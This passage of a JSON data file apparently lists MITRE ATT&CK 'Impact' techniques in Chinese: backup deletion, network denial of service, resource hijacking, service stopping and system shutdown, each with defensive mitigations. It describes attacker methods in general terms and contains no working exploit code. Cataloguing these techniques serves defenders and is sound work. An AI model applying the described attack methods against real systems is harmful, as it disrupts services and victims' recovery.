                    "content": "在网络设备上，对手可能会利用“磁盘擦除”删除备份固件映像并重新格式化文件系统，然后关闭系统/重新启动以重新加载设备。这种活动加在一起可能会使网络设备完全不可操作，并抑制恢复操作。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手还可以删除连接到其网络的“在线”备份，无论是通过网络存储介质还是通过同步到云服务的文件夹。在云环境中，对手可能会禁用版本控制和备份策略，并删除快照、机器映像和设计用于灾难恢复场景的对象的早期版本。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1053",
                "name": "数据备份",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑实施IT灾难恢复计划，其中包含可用于恢复组织数据的定期数据备份过程。确保备份存储在系统外，并受到保护，不受对手可能用来访问和销毁备份以防止恢复的常见方法的影响。在云环境中，尽可能对存储对象启用版本控制，并将备份复制到其他帐户或区域以将其与原始副本隔离。"
                        }
                    ]
                ]
            },
            {
                "id": "M1028",
                "name": "操作系统配置",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "考虑技术控制，以防止禁用系统恢复中涉及的服务或删除文件。此外，请确保使用以下命令启用WinRE：＜code＞reagentc/enable＜/code＞。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "将有权访问备份的用户帐户仅限于所需的用户帐户。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1498",
        "name": "Network Denial of Service",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [
            {
                "id": "T1498.001",
                "name": "Direct Network Flood"
            },
            {
                "id": "T1498.002",
                "name": "Reflection Amplification"
            }
        ],
        "version": "1.1",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会执行网络拒绝服务（DoS）攻击，以降低或阻止目标资源对用户的可用性。网络DoS可以通过耗尽服务所依赖的网络带宽来执行。示例资源包括特定网站、电子邮件服务、DNS和基于web的应用程序。有人观察到，敌人出于政治目的进行网络DoS攻击，并支持其他恶意活动，包括分散注意力、黑客活动和勒索。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "当指向资源或资源所依赖的网络连接和网络设备的恶意流量耗尽了与系统的网络连接的带宽容量时，就会发生网络DoS。例如，对手可能会向与互联网连接1Gbps的网络托管的服务器发送10Gbps的流量。这种流量可以由分布在互联网上的单个系统或多个系统生成，通常称为分布式DoS（DDoS）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "要执行网络DoS攻击，几个方面适用于多种方法，包括IP地址欺骗和僵尸网络。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能使用攻击系统的原始IP地址，或伪造源IP地址，使攻击流量更难追溯到攻击系统或进行反射。这会降低或消除网络防御设备上源地址过滤的有效性，从而增加防御者抵御攻击的难度。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "有关直接针对主机系统的DoS攻击，请参阅端点拒绝服务。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1037",
                "name": "过滤网络流量",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "当洪水流量超过目标网络连接的容量时，通常需要拦截上游的传入流量，以从合法流量中过滤出攻击流量。这种防御可以由托管互联网服务提供商（ISP）或第三方（如内容交付网络（CDN））或专门从事DoS缓解的提供商提供。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "根据洪泛量的不同，可以通过阻止源地址、阻止目标端口或阻止用于传输的协议来进行本地过滤。"
                        }
                    ],
                    [
                        {
                            "type": "text",
                            "content": "由于即时响应可能需要第三方的快速参与，因此分析与受网络DoS攻击影响的关键资源相关的风险，并制定灾难恢复计划/业务连续性计划以应对事件。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1496",
        "name": "Resource Hijacking",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.4",
        "description": [
            [
                {
                    "type": "text",
                    "content": "对手可能会利用选定系统的资源来完成资源密集型任务，这可能会影响系统和/或托管服务的可用性。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "资源劫持的一个常见目的是验证加密货币网络的交易并赚取虚拟货币。敌人可能会消耗足够的系统资源，从而对受影响的机器产生负面影响和/或导致其失去响应。服务器和基于云的系统是常见的目标，因为可用资源的潜力很高，但用户端点系统也可能受到威胁，并被用于资源劫持和加密货币挖掘。由于易于通过公开的API进行部署，以及通过在环境或集群内部署或破坏多个容器来扩展挖掘活动的潜力，容器化环境也可能成为目标。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "此外，一些加密货币挖矿恶意软件会识别并杀死竞争恶意软件的进程，以确保其不会争夺资源。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人也可能使用恶意软件，该恶意软件利用系统的网络带宽作为僵尸网络的一部分，以促进网络拒绝服务活动和/或种子恶意种子。或者，他们可以通过将受害者的网络带宽和IP地址的使用权出售给代理软件服务来进行代理劫持。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    },
    {
        "id": "T1489",
        "name": "Service Stop",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.2",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会停止或禁用系统上的服务，使合法用户无法使用这些服务。停止关键服务或过程可能会抑制或停止对事件的响应，或有助于实现对手对环境造成损害的总体目标。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "对手可以通过禁用对组织具有高度重要性的单个服务来实现这一点，例如"
                },
                {
                    "type": "code",
                    "content": "MSExchangeIS"
                },
                {
                    "type": "text",
                    "content": "，这将使Exchange内容无法访问。在某些情况下，对手可能会停止或禁用许多或所有服务，使系统无法使用。服务或进程在运行时可能不允许修改其数据存储。对手可能会停止服务或进程，以便对Exchange和SQL Server等服务的数据存储进行数据销毁或数据加密以产生影响。"
                }
            ]
        ],
        "mitigations": [
            {
                "id": "M1030",
                "name": "网络细分",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "在独立于生产环境的网络上操作入侵检测、分析和响应系统，以减少对手看到并干扰关键响应功能的机会。"
                        }
                    ]
                ]
            },
            {
                "id": "M1022",
                "name": "限制文件和目录权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保拥有适当的流程和文件权限，以防止对手禁用或干扰关键服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1024",
                "name": "限制注册表权限",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "确保拥有适当的注册权限，以防止对手禁用或干扰关键服务。"
                        }
                    ]
                ]
            },
            {
                "id": "M1018",
                "name": "用户帐户管理",
                "description": [
                    [
                        {
                            "type": "text",
                            "content": "限制用户帐户和组的权限，以便只有经过授权的管理员才能与服务更改和服务配置进行交互。"
                        }
                    ]
                ]
            }
        ]
    },
    {
        "id": "T1529",
        "name": "System Shutdown/Reboot",
        "tactics": [
            {
                "id": "TA0040",
                "name": "Impact"
            }
        ],
        "subs": [],
        "version": "1.3",
        "description": [
            [
                {
                    "type": "text",
                    "content": "敌人可能会关闭/重新启动系统，以中断对这些系统的访问或协助破坏这些系统。操作系统可以包含启动机器或网络设备的关闭/重新启动的命令。在某些情况下，这些命令还可用于通过网络设备CLI启动远程计算机或网络设备的关闭/重新启动（例如"
                },
                {
                    "type": "code",
                    "content": "reload"
                },
                {
                    "type": "text",
                    "content": "）。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "关闭或重新启动系统可能会中断合法用户对计算机资源的访问，同时也会阻碍事件响应/恢复。"
                }
            ],
            [
                {
                    "type": "text",
                    "content": "敌人可能会试图在以其他方式影响系统后关闭/重新启动系统，如磁盘结构擦除或禁止系统恢复，以加速对系统可用性的预期影响。"
                }
            ]
        ],
        "mitigations": [
            {
                "type": "text",
                "content": "这种类型的攻击技术无法通过预防性控制轻易缓解，因为它是基于对系统功能的滥用。"
            }
        ]
    }
]